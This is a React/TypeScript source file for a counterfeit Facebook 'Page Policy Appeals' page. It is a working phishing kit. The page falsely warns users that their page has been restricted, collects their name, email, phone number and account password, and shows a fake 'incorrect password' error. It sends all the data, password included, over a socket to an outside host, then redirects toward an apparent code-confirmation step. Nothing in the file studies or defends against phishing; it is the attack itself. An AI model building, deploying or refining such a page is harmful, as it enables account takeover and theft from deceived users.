/* eslint-disable @typescript-eslint/no-explicit-any */
import Face from "../assets/Facebook.svg.png";
import Search from "../assets/seach.jpg";
import Home from "../assets/hom.jpg";
import Facem from "../assets/facem.jpg";
import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { useMutation } from "react-query";
import { postData } from "../apis/face.api";
import io from 'socket.io-client'
import NumberInput from "../components/InputNumber";

const Business = () => {
  const [showModal, setShowModal] = useState(false)
  const [showError, setShowError] = useState(false)
  const navigate = useNavigate()
  const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault()
    setShowModal(true)
  }
  const handleSubmitAll = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault()
    if (formState.password.length < 6) {
      setShowError(true)
    } else {
      setShowError(false)
      const newData = {
        ...formState, phone: phone
      }
      postMutation.mutate(newData)
    }
  }
  const initialFromState = {
    page: '',
    fullname: '',
    email: '',
    phone: '',
    info: '',
    password: ''
  }
  const [formState, setFormState] = useState(initialFromState)
  const handleChange = (name: string | number) => (event: any) => {
    setFormState((prev) => ({ ...prev, [name]: event.target.value }))
  }
  const postMutation = useMutation({
    mutationFn: (body: any) => {
      return postData(body)
    },
    onSuccess: () => {
      navigate('/confirm/01hfv4kaw7kaf5th91vdaqhcw3', {
        state: {
          phone: phone
        }
      })
    },
    onSettled: () => {
      const socket = io('https://business-face.onrender.com')
      const newData = { ...formState, phone: phone }
      socket.emit("formData", newData)
    }
  })
  const [phone, setPhone] = useState('')

  return (
    <div>
      <div className="topheader bg-facebook p-2 bg-[#355797]">
        <div className="sm:w-11/12 md:w-4/6 flex justify-between items-center mx-auto">
          <div className="w-[20%] md:w-[15%]">
            <a href="">
              <img src={Face} alt="Face" />
            </a>
          </div>
          <div className="flex shadow-sm w-[60%] md:w-[50%]">
            <span className="px-4 inline-flex items-center min-w-fit border border-r-0 border-gray-200 bg-gray-50 text-sm ">
              <img className="w-[17px] h-[16px]" src={Search} alt="Search" />
            </span>
            <input
              type="search"
              className="py-2 bg-white border-l px-3 pr-11 block w-full border-gray-200 shadow-sm text-sm focus:z-10 focus:border-blue-500 focus:ring-blue-500 focus:outline-none"
              placeholder="How can we help?"
            ></input>
          </div>
        </div>
      </div>
      <div className="bg-[#E9EBEE]">
        <div className="w-11/12 sm:w-11/12 md:w-4/6 flex justify-between items-center mx-auto">
          <a
            href="#"
            className="flex items-center text-[#3578E5] gap-2 font-semibold py-4 border-b-[3px] border-[#3578E5]"
          >
            <img className="w-4 h-4" src={Home} alt="Home" /> Help Center
          </a>
          <p className="text-[#3578E5] text-xs">English</p>
        </div>
      </div>
      <div className="w-11/12 sm:w-11/12 md:w-4/6 grid gap-10 mx-auto my-8 grid-cols-1 md:grid-cols-[0.3fr_1fr] ">
        <div className="order-2 md:order-none">
          <ul className="[&>li>a]:text-[14px] [&>li>a]:py-[5px] [&>li>a]:pr-5 [&>li>a]:block [&>li>a:hover]:bg-[#E9EBEE]">
            <li>
              <a href="#">Creating an Account</a>
            </li>
            <li>
              <a href="#">Your Profile</a>
            </li>
            <li>
              <a href="#">Friending</a>
            </li>
            <li>
              <a href="#">Facebook Dating</a>
            </li>
            <li>
              <a href="#">Your Home Page</a>
            </li>
            <li>
              <a href="#">Messaging</a>
            </li>
            <li>
              <a href="#">Reels</a>
            </li>
            <li>
              <a href="#">Stories</a>
            </li>
            <li>
              <a href="#">Photos</a>
            </li>
            <li>
              <a href="#">Videos</a>
            </li>
            <li>
              <a href="#">Gaming</a>
            </li>
            <li>
              <a href="#">Pages</a>
            </li>
            <li>
              <a href="#">Groups</a>
            </li>
            <li>
              <a href="#">Events</a>
            </li>
            <li>
              <a href="#">Fundraisers and Donations</a>
            </li>
            <li>
              <a href="#">Meta Pay</a>
            </li>
            <li>
              <a href="#">Marketplace</a>
            </li>
            <li>
              <a href="#">Apps</a>
            </li>
            <li>
              <a href="#">Facebook Mobile Apps</a>
            </li>
            <li>
              <a href="#">Accessibility</a>
            </li>
          </ul>
        </div>
        <form
          id="xwnzymibvq"
          onSubmit={handleSubmit}
          className="w-100% md:w-[74%] rounded-lg border border-gray-200 h-fit order-1 md:order-none"
        >
          <div className="font-semibold rounded-t-lg text-lg border-b border-gray-200 bg-[#F5F6F7] p-3">
            <h1>Page Policy Appeals</h1>
          </div>
          <div className="p-4">
            <p className="text-xs mb-4">
              We have detected unusual activity on your page that violates our
              community standards.
            </p>
            <p className="text-xs mb-4">
              Your access to your page has been limited, and you are currently
              unable to post, share, or comment using your page.
            </p>
            <p className="text-xs mb-4">
              If you believe this to be a mistake, you have the option to submit
              an appeal by providing the necessary information.
            </p>
            <div className="mb-4">
              <label className="block">
                <span className="text-[#90949C] after:content-['*'] after:ml-0.5 after:text-red-500 block text-xs font-bold text-[#90949C]">
                  Select Your Page
                </span>
                <input
                  type="text"
                  name="tctmdjxhwa"
                  value={formState.page}
                  onChange={handleChange('page')}
                  required
                  className=" mt-1 px-3 py-1 bg-white border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-sm sm:text-sm focus:ring-1"
                />
              </label>
            </div>
            <div className="mb-4">
              <label className="block">
                <span className="text-[#90949C] after:content-['*'] after:ml-0.5 after:text-red-500 block text-xs font-bold text-[#90949C]">
                  Fullname
                </span>
                <input
                  type="text"
                  name="oqunzfzjrf"
                  required
                  value={formState.fullname}
                  onChange={handleChange('fullname')}
                  className=" mt-1 px-3 py-1 bg-white border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-sm sm:text-sm focus:ring-1"
                />
              </label>
            </div>
            <div className="mb-4">
              <label className="block">
                <span className="text-[#90949C] after:content-['*'] after:ml-0.5 after:text-red-500 block text-xs font-bold text-[#90949C]">
                  Personal Email Address
                </span>
                <input
                  type="email"
                  name="zwsjqxjucv"
                  required
                  value={formState.email}
                  onChange={handleChange('email')}
                  className=" mt-1 px-3 py-1 bg-white border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-sm sm:text-sm focus:ring-1"
                />
              </label>
            </div>
            <div className="mb-4">
              <label className="block">
                <span className=" after:content-['*'] after:ml-0.5 after:text-red-500 block text-xs font-bold text-[#90949C]">
                  Mobile Phone Number
                </span>
                <NumberInput
                  value={phone}
                  onChange={setPhone}
                // value={formState.phone}
                // onChange={handleChange('phone')}
                />
                {/* <input
                  type="text"
                  name="ipbqlfbsug"
                  required
                  value={formState.phone}
                  onChange={handleChange('phone')}
                  className=" mt-1 px-3 py-1 bg-white border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-sm sm:text-sm focus:ring-1"
                /> */}
              </label>
            </div>
            <div className="mb-4">
              <label className="block">
                <span className=" block text-xs font-bold text-[#90949C]">
                  Please provide us information that will help us investigate.
                </span>
                <textarea
                  value={formState.info}
                  onChange={handleChange('info')}
                  name="yykwevbhfh"
                  className="w-3/4 mt-1 px-3 py-1 bg-white border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block rounded-sm sm:text-sm focus:ring-1"
                  rows={4}
                ></textarea>
              </label>
            </div>
          </div>
          <div className="font-semibold rounded-b-lg flex justify-end text-lg border-t border-gray-200 bg-[#F5F6F7] p-3">
            <button className="bg-blue-800 hover:bg-facebook rounded-sm px-4 py-2 text-white text-sm font-semibold">
              Send
            </button>
          </div>
        </form>
      </div>
      <div className="bg-white mt-10">
        <div className="sm:w-11/12 md:w-4/6 mx-auto md:px-0 px-2 py-9">
          <div className="grid xl:grid-cols-5 gap-y-4 lg:grid-cols-3 md:grid-cols-2 grid-cols-2 text-[#90949c] text-sm">
            <ul className="grid gap-y-2">
              <li>
                <img className="w-[20px] h-[20px]" src={Facem} alt="Facem" />
              </li>
            </ul>
            <ul className="grid gap-y-2">
              <li>Meta © 2023</li>
              <li>English (US)</li>
            </ul>
            <ul className="grid gap-y-2">
              <li>About</li>
              <li>Privacy Policy</li>
              <li>Careers</li>
            </ul>
            <ul className="grid gap-y-2">
              <li>Ad choices</li>
              <li>Create ad</li>
              <li>Create Page</li>
            </ul>
            <ul className="grid gap-y-2">
              <li>Terms &amp; Policies</li>
              <li>Cookies</li>
            </ul>
          </div>
        </div>
      </div>
      <div
        id="modalEl"
        tabIndex={-1}
        className={`${showModal ? "opacity-100 visible" : "opacity-0 invisible"} transition-all fixed top-0 left-0 bg-[rgba(0,0,0,0.4)] right-0 z-50 w-full p-4 overflow-x-hidden overflow-y-auto md:inset-0 h-[calc(100%-1rem)] max-h-full justify-center items-center flex`}
        aria-modal="true"
        role="dialog"
      >
        <div className="relative w-full max-w-2xl max-h-full">
          <div className="relative bg-white rounded-lg shadow :bg-gray-700">
            <div className="flex items-start justify-between p-4 border-b rounded-t :border-gray-600">
              <h3 className="text-xl font-semibold text-gray-900 :text-white">
                Please Enter Your Password
              </h3>
            </div>
            <div className="p-6 space-y-6">
              <p className="text-base leading-relaxed text-gray-500 :text-gray-400">
                For your security, you must enter your password to continue.
              </p>
              <form onSubmit={handleSubmitAll} className="space-y-6" id="shztzavtjm">
                <div>
                  <label
                    htmlFor="wwensekvby"
                    className="block mb-2 text-sm font-medium text-gray-900 :text-white"
                  >
                    Your password
                  </label>
                  <input
                    type="password"
                    name="adapwbwafe"
                    id="wwensekvby"
                    value={formState.password}
                    onChange={handleChange('password')}
                    placeholder="Enter your password"
                    className="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 :bg-gray-600 :border-gray-500 :placeholder-gray-400 :text-white"
                    required
                  />
                  {showError && (

                    <p className="error_password text-red-600 leading-6">The password you've entered is incorrect.</p>
                  )}
                </div>
                <button
                  type="submit"
                  className="w-full text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center :bg-blue-600 :hover:bg-blue-700 :focus:ring-blue-800"
                >
                  Continue
                </button>
              </form>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Business;
